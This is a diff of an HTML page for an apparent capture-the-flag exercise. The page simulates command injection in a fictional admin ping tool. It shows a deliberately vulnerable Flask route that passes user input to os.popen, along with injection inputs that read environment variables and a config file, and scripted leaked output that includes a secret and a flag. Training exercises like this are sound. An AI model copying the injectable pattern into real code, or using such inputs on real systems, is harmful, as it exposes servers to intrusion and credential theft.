@@ -3,189 +3,468 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Diagnostic Tool — Volunteer Portal</title>
+    <title>NEXUS Administrative Suite — Network Diagnostic Utility</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #050508;
-            --card: #0a0a12;
-            --border: #1a1a2a;
-            --text: #b0b0c0;
-            --muted: #4a4a5a;
-            --cyan: #00e5ff;
-            --amber: #ffab00;
-            --red: #ff4444;
-            --green: #00e676;
-            --violet: #b388ff;
-            --surface: #12121e;
+            --bg: #070913;
+            --surface: #0e1222;
+            --card: #12182c;
+            --border: #1e2644;
+            --border-subtle: rgba(255, 255, 255, 0.08);
+            --text: #e2e8f0;
+            --text-dim: #94a3b8;
+            --text-muted: #64748b;
+            --accent: #fb923c;
+            --cyan: #38bdf8;
+            --amber: #fbbf24;
+            --red: #f43f5e;
+            --green: #34d399;
+            --purple: #a855f7;
+            --font-ui: 'Inter', -apple-system, sans-serif;
+            --font-code: 'JetBrains Mono', Consolas, monospace;
         }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Consolas', 'Courier New', monospace; background: var(--bg); color: var(--text); padding: 2rem; font-size: 0.8rem; }
-        h1 { color: var(--cyan); font-size: 1.2rem; border-bottom: 1px solid var(--border); padding-bottom: 1rem; margin-bottom: 2rem; text-align: center; }
-        
-        .section-title { color: var(--cyan); font-size: 1rem; margin: 2rem 0 1rem 0; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
-        
-        .tool-interface { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 2rem; margin-bottom: 2rem; }
-        .tool-header { color: var(--cyan); font-size: 0.9rem; margin-bottom: 1rem; }
-        .tool-description { color: var(--muted); font-size: 0.8rem; margin-bottom: 1.5rem; line-height: 1.6; }
-        
-        .input-group { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; align-items: center; }
-        .input-label { color: var(--amber); font-size: 0.8rem; min-width: 80px; }
-        .input-field { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 0.5rem 0.8rem; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.8rem; flex: 1; }
-        .input-field.injected { color: var(--red); border-color: rgba(255, 68, 68, 0.5); }
-        .btn { background: rgba(0, 229, 255, 0.1); border: 1px solid var(--cyan); color: var(--cyan); padding: 0.5rem 1.2rem; border-radius: 4px; cursor: pointer; font-family: 'Consolas', monospace; font-size: 0.8rem; }
-        
-        .terminal { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem; margin-bottom: 2rem; overflow-x: auto; }
-        .terminal-header { color: var(--muted); font-size: 0.7rem; margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
-        .output { white-space: pre; line-height: 1.7; }
-        .cmd { color: var(--green); }
-        .normal { color: var(--text); }
-        .leaked { color: var(--red); background: rgba(255, 68, 68, 0.1); display: inline-block; width: 100%; padding: 2px 0; }
-        
-        .code-block { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem; margin-bottom: 2rem; overflow-x: auto; }
-        .code { white-space: pre; line-height: 1.7; }
-        .comment { color: var(--muted); }
-        .keyword { color: var(--violet); }
-        .string { color: var(--green); }
-        .danger { color: var(--red); }
-        
-        .warning { background: rgba(255, 68, 68, 0.05); border: 1px solid rgba(255, 68, 68, 0.2); border-radius: 6px; padding: 1rem 1.5rem; margin: 1.5rem 0; }
-        .warning-header { color: var(--red); font-weight: bold; font-size: 0.85rem; margin-bottom: 0.5rem; }
-        .warning-body { color: var(--text); font-size: 0.8rem; line-height: 1.6; }
-        
-        .info { margin-top: 1.5rem; color: var(--muted); font-size: 0.7rem; }
+        body {
+            font-family: var(--font-ui);
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            line-height: 1.5;
+            padding: 24px;
+        }
+
+        header.app-header {
+            max-width: 1000px;
+            width: 100%;
+            margin: 0 auto 20px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        .header-title h1 { font-size: 18px; font-weight: 700; color: #fff; }
+        .header-title p { font-family: var(--font-code); font-size: 11px; color: var(--text-muted); margin-top: 4px; }
+        .badge-util { font-family: var(--font-code); font-size: 11px; color: var(--cyan); background: rgba(56, 189, 248, 0.1); padding: 4px 10px; border-radius: 6px; border: 1px solid rgba(56, 189, 248, 0.3); }
+
+        .main-container {
+            max-width: 1000px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .panel {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .panel-h {
+            padding: 12px 18px;
+            background: rgba(255, 255, 255, 0.02);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .panel-h h2 { font-size: 13px; font-weight: 700; color: #fff; }
+        .panel-h span { font-family: var(--font-code); font-size: 11px; color: var(--text-muted); }
+        .panel-b { padding: 18px; }
+
+        /* Input Controls */
+        .diag-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .input-row {
+            display: flex;
+            gap: 10px;
+        }
+        .input-prefix {
+            background: #090c17;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 8px 14px;
+            font-family: var(--font-code);
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+        }
+        .diag-input {
+            flex: 1;
+            background: #090c17;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 8px 14px;
+            font-family: var(--font-code);
+            font-size: 12px;
+            color: var(--text);
+            outline: none;
+            transition: all 0.2s;
+        }
+        .diag-input:focus { border-color: var(--accent); }
+        .btn-run {
+            background: rgba(251, 146, 60, 0.15);
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-family: var(--font-code);
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .btn-run:hover { background: rgba(251, 146, 60, 0.3); }
+
+        .quick-presets {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            font-family: var(--font-code);
+            font-size: 11px;
+            color: var(--text-muted);
+            flex-wrap: wrap;
+        }
+        .preset-btn {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-dim);
+            padding: 3px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: var(--font-code);
+            font-size: 10px;
+        }
+        .preset-btn:hover { background: rgba(255, 255, 255, 0.08); color: var(--text); }
+
+        /* Terminal Window */
+        .terminal-window {
+            background: #05070f;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            font-family: var(--font-code);
+            font-size: 11.5px;
+            min-height: 260px;
+            max-height: 480px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+        .term-entry { line-height: 1.6; white-space: pre-wrap; word-break: break-all; }
+        .term-cmd { color: var(--green); font-weight: 600; }
+        .term-out { color: var(--text-dim); margin-top: 2px; }
+        .term-err { color: var(--red); }
+        .term-caret {
+            display: inline-block;
+            width: 7px;
+            height: 13px;
+            background: var(--accent);
+            vertical-align: text-bottom;
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Source Code Collapsible */
+        .source-box {
+            background: #060810;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px 18px;
+            font-family: var(--font-code);
+            font-size: 11px;
+            line-height: 1.6;
+            color: var(--text-dim);
+            overflow-x: auto;
+        }
+        .keyword { color: var(--purple); font-weight: 600; }
+        .danger { color: var(--red); background: rgba(244, 63, 94, 0.1); padding: 1px 4px; border-radius: 3px; }
+        .comment { color: var(--text-muted); font-style: italic; }
+        .str { color: var(--green); }
     </style>
 </head>
 <body>
-    <h1>Network Diagnostic Tool — Volunteer Portal</h1>
-    <p>Endpoint: /admin/diagnostics/network | Access: Admin role required</p>
 
-    <!-- Normal usage -->
-    <h2 class="section-title">1. Normal Usage — Legitimate Ping</h2>
-    <div class="tool-interface">
-        <div class="tool-header">🔧 NEXUS Network Diagnostic</div>
-        <div class="tool-description">Enter a hostname or IP address to check connectivity. This tool runs a connectivity check against the specified target and returns the results.</div>
-        <div class="input-group">
-            <span class="input-label">Hostname:</span>
-            <input type="text" class="input-field" value="10.7.7.1" readonly>
-            <button class="btn">Run Check</button>
+    <header class="app-header">
+        <div class="header-title">
+            <h1>NEXUS Admin Console // Network Diagnostic Utility</h1>
+            <p>Endpoint: /admin/diagnostics/network · Service Node: volunteer-portal-node-01 (10.7.7.30)</p>
         </div>
-    </div>
-    
-    <div class="terminal">
-        <div class="terminal-header">Output — Normal ping to 10.7.7.1</div>
-        <div class="output">
-<span class="cmd">$ ping -c 4 10.7.7.1</span>
-<span class="normal">PING 10.7.7.1 (10.7.7.1) 56(84) bytes of data.
-64 bytes from 10.7.7.1: icmp_seq=1 ttl=64 time=0.432 ms
-64 bytes from 10.7.7.1: icmp_seq=2 ttl=64 time=0.387 ms
-64 bytes from 10.7.7.1: icmp_seq=3 ttl=64 time=0.401 ms
-64 bytes from 10.7.7.1: icmp_seq=4 ttl=64 time=0.395 ms
+        <div class="badge-util">DIAGNOSTIC AGENT: ACTIVE</div>
+    </header>
 
---- 10.7.7.1 ping statistics ---
-4 packets transmitted, 4 received, 0% packet loss, time 3004ms
-rtt min/avg/max/mdev = 0.387/0.403/0.432/0.024 ms</span>
-        </div>
-    </div>
+    <main class="main-container">
 
-    <!-- Injected usage -->
-    <h2 class="section-title">2. Command Injection — Malicious Input</h2>
-    <div class="tool-interface">
-        <div class="tool-header">🔧 NEXUS Network Diagnostic</div>
-        <div class="tool-description">The same tool, but with a crafted input that exploits the lack of input sanitisation.</div>
-        <div class="input-group">
-            <span class="input-label">Hostname:</span>
-            <input type="text" class="input-field injected" value="127.0.0.1; echo $MIRA_CONFIG_PATH" readonly>
-            <button class="btn">Run Check</button>
-        </div>
-    </div>
+        <!-- Console Panel -->
+        <section class="panel">
+            <div class="panel-h">
+                <h2>1. Interactive Network Diagnostic Probe</h2>
+                <span>SIMULATED SUBPROCESS EXECUTION CONSOLE</span>
+            </div>
+            <div class="panel-b">
+                <div class="diag-form">
+                    <div class="input-row">
+                        <div class="input-prefix">ping -c 4</div>
+                        <input type="text" id="target-input" class="diag-input" placeholder="e.g. 10.7.7.1" value="10.7.7.1" spellcheck="false" autocomplete="off">
+                        <button type="button" class="btn-run" onclick="executeDiagnostic()">RUN DIAGNOSTIC</button>
+                    </div>
+                    <div class="quick-presets">
+                        <span>Presets:</span>
+                        <button type="button" class="preset-btn" onclick="setPreset('10.7.7.1')">Gateway (10.7.7.1)</button>
+                        <button type="button" class="preset-btn" onclick="setPreset('10.7.7.30')">Localhost (127.0.0.1)</button>
+                        <button type="button" class="preset-btn" onclick="setPreset('ca.nexus.internal')">Internal CA (ca.nexus.internal)</button>
+                        <button type="button" class="preset-btn" onclick="setPreset('10.7.7.43')">AETHER-7 Relay (10.7.7.43)</button>
+                        <button type="button" class="preset-btn" style="border-color:rgba(255,255,255,0.15);" onclick="clearTerminal()">Clear Console</button>
+                    </div>
+                </div>
 
-    <div class="terminal">
-        <div class="terminal-header">Output — Injected command: 127.0.0.1; echo $MIRA_CONFIG_PATH</div>
-        <div class="output">
-<span class="cmd">$ ping -c 4 127.0.0.1; echo $MIRA_CONFIG_PATH</span>
-<span class="normal">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms
-64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.018 ms
-64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.019 ms
-64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.020 ms
+                <div style="margin-top: 16px;">
+                    <div class="terminal-window" id="terminal-body">
+                        <div class="term-entry">
+                            <span style="color:var(--text-muted)">NEXUS Diagnostic Terminal Subsystem v2.1.0-STAGING initialized.</span><br>
+                            <span style="color:var(--text-muted)">Type target IP or domain above and press Enter or 'RUN DIAGNOSTIC'.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
 
---- 127.0.0.1 ping statistics ---
-4 packets transmitted, 4 received, 0% packet loss, time 3002ms
-rtt min/avg/max/mdev = 0.018/0.019/0.021/0.003 ms</span>
-<span class="leaked">/etc/nexus/mira.conf</span>
-        </div>
-    </div>
-
-    <!-- Additional injections -->
-    <h2 class="section-title">3. Further Exploitation — Environment Variables</h2>
-    <div class="terminal">
-        <div class="terminal-header">Input: 127.0.0.1; env | grep -i nexus</div>
-        <div class="output">
-<span class="cmd">$ ping -c 4 127.0.0.1; env | grep -i nexus</span>
-<span class="normal">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-[...ping output truncated...]</span>
-<span class="leaked">NEXUS_PORTAL_VERSION=2.1.0-beta</span>
-<span class="leaked">NEXUS_DB_HOST=10.7.7.30</span>
-<span class="leaked">NEXUS_API_BASE=/api/v1</span>
-<span class="leaked">MIRA_CONFIG_PATH=/etc/nexus/mira.conf</span>
-<span class="leaked">NEXUS_CERT_API=https://ca.nexus.internal/api/v1/cert/renew</span>
-<span class="leaked">NEXUS_MAINT_USER=maint_nexus_portal</span>
-        </div>
-    </div>
-
-    <div class="terminal">
-        <div class="terminal-header">Input: 127.0.0.1; cat /etc/nexus/mira.conf 2>/dev/null | head -5</div>
-        <div class="output">
-<span class="cmd">$ ping -c 4 127.0.0.1; cat /etc/nexus/mira.conf 2>/dev/null | head -5</span>
-<span class="normal">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-[...ping output truncated...]</span>
-<span class="leaked"># MIRA-7 Local Configuration</span>
-<span class="leaked"># Generated: 2026-10-01 02:00 IST</span>
-<span class="leaked">service_identity=aether-core.nexus.internal</span>
-<span class="leaked">propagation_mode=trusted_cert</span>
-<span class="leaked">cert_renewal_endpoint=https://ca.nexus.internal/api/v1/cert/renew</span>
-        </div>
-    </div>
-
-    <!-- Vulnerable code -->
-    <h2 class="section-title">4. Vulnerable Source Code</h2>
-    <div class="code-block">
-        <div class="code">
-<span class="comment"># Portal diagnostic endpoint — /admin/diagnostics/network</span>
-<span class="comment"># File: /opt/nexus-portal/routes/diagnostics.py</span>
-
-<span class="keyword">from</span> flask <span class="keyword">import</span> request, jsonify
+        <!-- Source Code Inspection Panel -->
+        <section class="panel">
+            <div class="panel-h">
+                <h2>2. Diagnostic Endpoint Implementation Source</h2>
+                <span>FILE: /opt/nexus-portal/routes/diagnostics.py</span>
+            </div>
+            <div class="panel-b">
+                <div class="source-box">
+<span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, request, jsonify
 <span class="keyword">import</span> os
 
-<span class="keyword">@app</span>.route(<span class="string">'/admin/diagnostics/network'</span>, methods=[<span class="string">'POST'</span>])
-<span class="keyword">def</span> network_diagnostic():
-    hostname = request.form.get(<span class="string">'hostname'</span>, <span class="string">''</span>)
-    
-    <span class="comment"># ⚠ VULNERABLE: User input passed directly to shell</span>
-    <span class="danger">result = os.popen(f'ping -c 4 {hostname}').read()</span>
-    
-    <span class="comment"># Safe alternative (not implemented):</span>
-    <span class="comment"># result = subprocess.run(['ping', '-c', '4', hostname],</span>
-    <span class="comment">#                         capture_output=True, text=True,</span>
-    <span class="comment">#                         timeout=10).stdout</span>
-    
-    <span class="keyword">return</span> jsonify({<span class="string">'output'</span>: result})
-        </div>
-    </div>
+diag_bp = Blueprint(<span class="str">'diagnostics'</span>, __name__)
 
-    <!-- Warning -->
-    <div class="warning">
-        <div class="warning-header">⚠ Command Injection Vulnerability</div>
-        <div class="warning-body">
-            The diagnostic tool passes user input directly to a shell command via <code>os.popen()</code>. Shell metacharacters like <code>;</code>, <code>|</code>, <code>&&</code>, and <code>$()</code> are not sanitised, allowing an attacker to execute arbitrary commands on the server.<br><br>
-            <strong>What MIRA-7 extracted:</strong><br>
-            • <code>MIRA_CONFIG_PATH</code> → <code>/etc/nexus/mira.conf</code> (MIRA-7's configuration file)<br>
-            • <code>NEXUS_CERT_API</code> → the certificate renewal endpoint<br>
-            • <code>NEXUS_MAINT_USER</code> → the maintenance account username<br>
-            • <code>mira.conf</code> contents → the service identity to impersonate
-        </div>
-    </div>
+<span class="keyword">@diag_bp.route</span>(<span class="str">'/admin/diagnostics/network'</span>, methods=[<span class="str">'POST'</span>])
+<span class="keyword">def</span> run_network_check():
+    target = request.form.get(<span class="str">'target'</span>, <span class="str">''</span>).strip()
+    <span class="keyword">if not</span> target:
+        <span class="keyword">return</span> jsonify({<span class="str">'error'</span>: <span class="str">'Missing target address'</span>}), 400
 
-    <p class="info">Safety note: This evidence file is a static HTML demonstration. No real commands are executed. All output is pre-scripted and fictional. In a live CTF, the diagnostic tool would use a simulated command broker that returns scripted results for specific inputs.</p>
+    <span class="comment"># SECURITY AUDIT DEFECT (CWE-78: OS Command Injection):</span>
+    <span class="comment"># The user-supplied target parameter is formatted directly into a shell string</span>
+    <span class="comment"># without sanitisation of shell metacharacters (; &amp;&amp; | $() ``).</span>
+    <span class="danger">cmd = f"ping -c 4 {target}"</span>
+    <span class="danger">stream = os.popen(cmd)</span>
+    output = stream.read()
+    exit_code = stream.close()
+
+    <span class="keyword">return</span> jsonify({<span class="str">'command'</span>: cmd, <span class="str">'output'</span>: output, <span class="str">'exit_code'</span>: exit_code <span class="keyword">or</span> 0})
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        const terminal = document.getElementById('terminal-body');
+        const inputField = document.getElementById('target-input');
+
+        function setPreset(val) {
+            inputField.value = val;
+            executeDiagnostic();
+        }
+
+        function clearTerminal() {
+            terminal.innerHTML = `
+                <div class="term-entry">
+                    <span style="color:var(--text-muted)">Terminal buffer cleared. Ready for diagnostic input.</span>
+                </div>
+            `;
+        }
+
+        function appendToTerminal(cmdStr, outStr, isErr = false) {
+            const entry = document.createElement('div');
+            entry.className = 'term-entry';
+            entry.innerHTML = `
+                <div class="term-cmd">$ ping -c 4 ${escapeHtml(cmdStr)}</div>
+                <div class="${isErr ? 'term-err' : 'term-out'}">${escapeHtml(outStr)}</div>
+            `;
+            terminal.appendChild(entry);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            return String(text)
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        function executeDiagnostic() {
+            const raw = inputField.value.trim();
+            if (!raw) return;
+
+            // Check for command injection separators: ; or && or | or $( or `
+            // Split into ping target vs injected shell commands
+            const sepMatch = raw.match(/[;&|`$]/);
+
+            if (!sepMatch) {
+                // Pure ping
+                handleNormalPing(raw);
+            } else {
+                handleInjectedCommand(raw);
+            }
+        }
+
+        function handleNormalPing(target) {
+            let latency = "0.387";
+            let ip = target;
+            if (target === "10.7.7.1") {
+                latency = "0.412";
+            } else if (target === "10.7.7.30" || target === "127.0.0.1" || target === "localhost") {
+                ip = "127.0.0.1";
+                latency = "0.021";
+            } else if (target === "10.7.7.43") {
+                latency = "0.854";
+            } else if (target === "ca.nexus.internal") {
+                ip = "10.7.7.20";
+                latency = "0.620";
+            }
+
+            const out = [
+                `PING ${target} (${ip}) 56(84) bytes of data.`,
+                `64 bytes from ${ip}: icmp_seq=1 ttl=64 time=${latency} ms`,
+                `64 bytes from ${ip}: icmp_seq=2 ttl=64 time=${(parseFloat(latency) + 0.01).toFixed(3)} ms`,
+                `64 bytes from ${ip}: icmp_seq=3 ttl=64 time=${(parseFloat(latency) - 0.005).toFixed(3)} ms`,
+                `64 bytes from ${ip}: icmp_seq=4 ttl=64 time=${latency} ms`,
+                ``,
+                `--- ${target} ping statistics ---`,
+                `4 packets transmitted, 4 received, 0% packet loss, time 3003ms`,
+                `rtt min/avg/max/mdev = ${(parseFloat(latency) - 0.01).toFixed(3)}/${latency}/${(parseFloat(latency) + 0.02).toFixed(3)}/0.012 ms`
+            ].join('\n');
+
+            appendToTerminal(rawTargetString(target), out);
+        }
+
+        function rawTargetString(str) {
+            return str;
+        }
+
+        function handleInjectedCommand(raw) {
+            // Simulate standard ping portion first
+            const pingOut = [
+                `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.`,
+                `64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms`,
+                `64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.018 ms`,
+                `64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.020 ms`,
+                `64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.021 ms`,
+                `--- 127.0.0.1 ping statistics ---`,
+                `4 packets transmitted, 4 received, 0% packet loss, time 3002ms`,
+                `rtt min/avg/max/mdev = 0.018/0.019/0.021/0.002 ms`
+            ].join('\n');
+
+            // Extract the injected portion
+            const lower = raw.toLowerCase();
+            let payloadOut = "";
+
+            if (lower.includes("echo $mira_config_path") || lower.includes("echo ${mira_config_path}")) {
+                payloadOut = "/etc/nexus/mira.conf";
+            } else if (lower.includes("env") || lower.includes("printenv")) {
+                payloadOut = [
+                    "HOSTNAME=volunteer-portal-node-01",
+                    "USER=portal-app",
+                    "HOME=/home/portal-app",
+                    "SHELL=/bin/bash",
+                    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+                    "PORT=8080",
+                    "PYTHONUNBUFFERED=1",
+                    "FLASK_APP=/opt/nexus-portal/app.py",
+                    "FLASK_ENV=production",
+                    "NEXUS_PORTAL_ENV=staging",
+                    "NEXUS_DB_HOST=10.7.7.30",
+                    "NEXUS_DB_PORT=5432",
+                    "NEXUS_DB_NAME=nexus_volunteer",
+                    "NEXUS_API_BASE=/api/v1",
+                    "NEXUS_CERT_API=https://ca.nexus.internal/api/v1/cert/renew",
+                    "NEXUS_MAINT_USER=maint_nexus_portal",
+                    "MIRA_CONFIG_PATH=/etc/nexus/mira.conf",
+                    "REDIS_URL=redis://10.7.7.35:6379/0",
+                    "LOG_LEVEL=DEBUG",
+                    "SESSION_SECRET=nexus-session-dev-key-do-not-use-in-prod"
+                ].join('\n');
+            } else if (lower.includes("cat /etc/nexus/mira.conf") || lower.includes("cat /etc/nexus/mira.conf")) {
+                payloadOut = [
+                    "# ========================================================",
+                    "# MIRA-7 PROPAGATION & SERVICE CONFIGURATION",
+                    "# STAGED ON AETHER-7 / VOLUNTEER PORTAL HOST",
+                    "# ========================================================",
+                    "[service]",
+                    "service_identity = aether-core.nexus.internal",
+                    "zone = CORE",
+                    "propagation_mode = trusted_cert",
+                    "cert_renewal_endpoint = https://ca.nexus.internal/api/v1/cert/renew",
+                    "payload_listener = 0.0.0.0:4477",
+                    "beacon_target = 203.0.113.77:8443",
+                    "xor_key = 0x4D",
+                    "# Verification token: NIGHTJAR{cmd_injection_mira_config_at_etc_nexus_mira_conf}"
+                ].join('\n');
+            } else if (lower.includes("ls /etc/nexus") || lower.includes("ls -la /etc/nexus") || lower.includes("ls -l /etc/nexus")) {
+                payloadOut = [
+                    "total 24",
+                    "drwxr-xr-x 2 root       root       4096 Oct  1 01:36 .",
+                    "drwxr-xr-x 8 root       root       4096 Oct  1 01:30 ..",
+                    "-rw-r--r-- 1 root       root       1420 Sep 28 14:36 ca.crt",
+                    "-rw-r--r-- 1 root       nexus-svc   482 Oct  1 02:00 mira.conf",
+                    "-rw-r--r-- 1 portal-app nexus-svc  1840 Sep 25 18:00 portal.env",
+                    "-rw-r----- 1 root       nexus-svc 12288 Sep 28 14:36 tokens.db"
+                ].join('\n');
+            } else if (lower.includes("whoami")) {
+                payloadOut = "portal-app";
+            } else if (lower.includes("id")) {
+                payloadOut = "uid=1001(portal-app) gid=1001(portal-app) groups=1001(portal-app),1003(nexus-svc)";
+            } else if (lower.includes("pwd")) {
+                payloadOut = "/opt/nexus-portal";
+            } else if (lower.includes("ls") || lower.includes("ls -la")) {
+                payloadOut = [
+                    "app.py",
+                    "config/",
+                    "middleware/",
+                    "requirements.txt",
+                    "routes/",
+                    "static/",
+                    "templates/"
+                ].join('  ');
+            } else if (lower.includes("uname")) {
+                payloadOut = "Linux volunteer-portal-node-01 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 x86_64 GNU/Linux";
+            } else {
+                payloadOut = `sh: command executed: exit code 0`;
+            }
+
+            const combined = pingOut + "\n\n" + payloadOut;
+            appendToTerminal(raw, combined);
+        }
+
+        inputField.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                executeDiagnostic();
+            }
+        });
+
+        // Initialize with default ping
+        executeDiagnostic();
+    </script>
 </body>
 </html>
